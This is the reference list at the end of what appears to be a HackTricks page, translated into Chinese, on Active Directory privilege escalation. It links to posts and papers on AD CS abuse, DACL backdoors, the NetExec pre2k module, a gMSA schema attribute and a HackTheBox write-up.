- [16] [滥用 AD CS，在 5 分钟内从子域管理员提权到企业管理员：后续篇](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/)
- [17] [袖中藏 ACE：设计 Active Directory DACL 后门](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)
- [18] [NetExec pre2k 模块源代码](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/pre2k.py)
- [19] [Microsoft ADSchema - msDS-GroupMSAMembership 属性](https://learn.microsoft.com/en-us/windows/win32/adschema/a-msds-groupmsamembership)
- [20] [0xdf - HTB Pirate](https://0xdf.gitlab.io/2026/09/05/htb-pirate.html)
{{#include ../../banners/hacktricks-training.md}}
